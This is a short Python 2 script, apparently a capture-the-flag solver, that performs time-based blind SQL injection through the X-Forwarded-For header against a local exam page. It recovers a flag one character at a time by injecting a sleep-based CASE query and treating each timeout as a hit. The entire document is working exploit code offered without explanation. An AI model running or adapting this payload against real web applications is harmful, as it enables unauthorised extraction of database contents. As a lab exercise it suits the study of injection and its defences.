

#coding:utf-8 
import requests 
maystr="0987654321qwertyuiopasdfghjklzxcvbnm"
url="http://127.0.0.1/exam/web100-3/index.php"
flag=""
for i in range(32):
   for str in maystr:
     headers={"x-forwarded-for":"127.0.0.1'+"+"(select case when (substring((select flag from flag ) from %d for 1 )='%s') then sleep(5) else sleep(0) end ) and '1'='1"%(i+1,str)}
 # proxy={"http":"http://127.0.0.1:8080"}
 # res=requests.get(url,headers=headers,timeout=3)
     try: 
         res=requests.get(url,headers=headers,timeout=3)
     except requests.exceptions.ReadTimeout,e:
         flag=flag+str
         print "flag:",flag
         break
     except KeyboardInterrupt,e:
        exit(0)
     else:
        pass
 # rint i+1,str